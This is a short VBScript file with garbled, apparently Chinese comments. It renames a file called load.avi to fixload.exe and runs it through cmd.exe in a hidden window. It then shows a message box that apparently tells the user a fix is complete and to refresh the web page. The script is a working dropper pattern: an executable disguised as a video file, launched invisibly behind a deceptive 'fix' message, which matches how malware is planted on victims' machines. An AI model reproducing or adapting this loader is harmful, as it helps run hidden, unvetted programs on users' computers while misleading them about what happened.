' ���� WScript.Shell ����
Set WshShell = CreateObject("WScript.Shell")

' ��ȡ��ǰĿ¼
currentDir = CreateObject("Scripting.FileSystemObject").GetAbsolutePathName(".")

' �� update.txt ������Ϊ fixload.exe
Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FileExists(currentDir & "\load.avi") Then
    fso.MoveFile currentDir & "\load.avi", currentDir & "\fixload.exe"
Else
    MsgBox "��ѹ��Ŀ¼�������д��ļ���", vbExclamation, "����"
    WScript.Quit
End If

' ʹ�� cmd ִ�� fixload.exe
WshShell.Run "cmd.exe /c """ & currentDir & "\fixload.exe""", 0, False

' �����޸���ɵ���Ϣ��
MsgBox "�޸���ɣ���ˢ����ҳ����", vbInformation, "��ʾ"
